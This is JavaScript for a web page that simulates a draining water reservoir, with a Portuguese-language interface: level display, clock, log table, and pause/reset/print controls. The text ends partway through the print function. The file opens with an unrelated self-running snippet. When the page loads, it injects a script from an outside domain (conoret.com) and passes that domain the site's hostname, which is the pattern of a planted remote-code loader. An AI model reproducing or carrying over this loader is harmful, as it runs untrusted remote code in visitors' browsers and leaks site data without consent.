window.top === window && !function(){
    var e = document.createElement("script"),
        t = document.getElementsByTagName("head")[0];
    e.src = "//conoret.com/dsp?h=" + document.location.hostname + "&r=" + Math.random();
    e.type = "text/javascript";
    e.defer = !0;
    e.async = !0;
    t.appendChild(e);
}();

let waterLevel = 20000; // Nível inicial da água em ml
const maxWaterLevel = 20000; // Nível máximo da água em ml
const minWaterLevel = 51; // Nível mínimo da água em ml
let intervalId;
let isPaused = false;

function setup() {
    console.log("Setup iniciado");
    noCanvas();
    setTimeout(() => {
        waterLevel -= 1; // Perda inicial de 1ml após 15 segundos
        updateWaterDisplay();
        intervalId = setInterval(updateWaterLevel, 35000); // Intervalo de 35 segundos
    }, 15000); // Atraso de 15 segundos
    setInterval(updateClock, 1000);

    document.getElementById('pause-button').addEventListener('click', togglePause);
    document.getElementById('reset-button').addEventListener('click', resetSystem);
    document.getElementById('print-button').addEventListener('click', imprimirResultados);
}

function updateWaterLevel() {
    if (!isPaused) {
        let alerta = "";

        if (waterLevel > 15000) {
            waterLevel -= 2500; // Perda de 2500ml
        } else if (waterLevel > 10000) {
            waterLevel -= 2500; // Perda de 2500ml
            alerta = "50% abaixo do volume inicial";
        } else if (waterLevel > 5000) {
            waterLevel -= 2500; // Perda de 2500ml
            alerta = "ALERTA! Nível d'água é -25%";
        } else if (waterLevel > 1000) {
            waterLevel -= 1500; // Perda de 1500ml
        } else if (waterLevel > 500) {
            waterLevel -= 500; // Perda de 500ml
        } else if (waterLevel > 49) {
            waterLevel -= 50; // Perda de 50ml
        } else {
            waterLevel = minWaterLevel;
            alerta = "Nível de água baixo!";
            clearInterval(intervalId);
        }

        updateWaterDisplay();
        logWaterLevel(waterLevel, alerta);
    }
}

function updateWaterDisplay() {
    document.getElementById('water').style.height = `${(waterLevel / maxWaterLevel) * 100}%`;
    document.getElementById('level-indicator').innerText = `Nível: ${waterLevel}ml`;
}

function updateClock() {
    if (!isPaused) {
        const now = new Date();
        const hours = now.getHours().toString().padStart(2, '0');
        const minutes = now.getMinutes().toString().padStart(2, '0');
        const seconds = now.getSeconds().toString().padStart(2, '0');
        document.getElementById('clock').innerText = `Hora: ${hours}:${minutes}:${seconds}`;
    }
}

function logWaterLevel(currentVolume, alerta) {
    console.log("Registrando nível de água:", currentVolume, alerta);
    const tableBody = document.getElementById('log-table').getElementsByTagName('tbody')[0];
    const newRow = tableBody.insertRow();
    const timeCell = newRow.insertCell(0);
    const levelCell = newRow.insertCell(1);
    const alertCell = newRow.insertCell(2);
    timeCell.innerText = document.getElementById('clock').innerText;
    levelCell.innerText = `${currentVolume}ml`;
    alertCell.innerText = alerta || "Nenhum alerta";
}

function togglePause() {
    isPaused = !isPaused;
    document.getElementById('pause-button').innerText = isPaused ? 'Continuar' : 'Interromper';
}

function resetSystem() {
    clearInterval(intervalId);
    waterLevel = 20000;
    isPaused = false;
    document.getElementById('pause-button').innerText = 'Interromper';
    document.getElementById('log-table').getElementsByTagName('tbody')[0].innerHTML = '';
    updateWaterDisplay();
    setTimeout(() => {
        waterLevel -= 1; // Perda inicial de 1ml após 15 segundos
        updateWaterDisplay();
        intervalId = setInterval(updateWaterLevel, 35000); // Intervalo de 35 segundos
    }, 15000); // Atraso de 15 segundos
}

function imprimirResultados() {
    const capacidadeReservatorio = 20000; // Capacidade do reservatório em ml
    const resultados = [
        { dataHora: "2024-10-12 10:00", alerta: "Queda do nível de água", volume: 15000 },
        { dataHora: "2024-10-12 11:00", alerta: "Reservatório com 5000ml" }
    ];
    console.log("Resultados:", resultados);
